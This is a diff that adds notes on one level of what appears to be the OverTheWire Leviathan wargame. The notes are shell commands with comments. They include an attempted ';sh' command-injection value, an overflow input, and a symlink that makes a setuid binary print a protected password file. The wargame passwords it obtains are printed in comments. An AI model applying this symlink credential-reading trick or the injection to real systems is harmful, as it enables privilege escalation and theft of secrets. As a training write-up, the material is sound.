@@ -224,3 +224,34 @@ find .trash
 
 for byte in $(.trash/bin); do rax2 -b ${byte} ; done # Tith4cokei
 ```
+
+## 5-6
+
+```sh
+ls -Alp
+file leviathan5 # not stripped :)
+./leviathan5 # cannot find /tmp/file.log
+
+touch /tmp/file.log
+./leviathan5 # nothing
+
+echo ben >> /tmp/file.log
+./leviathan5 # ben, as expected
+
+# could it be?
+echo ';sh' > /tmp/file.log
+./leviathan5 # ;sh
+# ah well, one can dream.
+
+# buffer overflow?
+python -c 'print("a"*5000)' > /tmp/file.log
+./leviathan5  # five thousand as (I counted)
+
+# I got it:
+ln /etc/leviathan_pass/leviathan6 /tmp/file.log # Invalid cross-device link
+# I do not.
+
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+./leviathan5 # UgaoFee4li
+# there we go.
+```
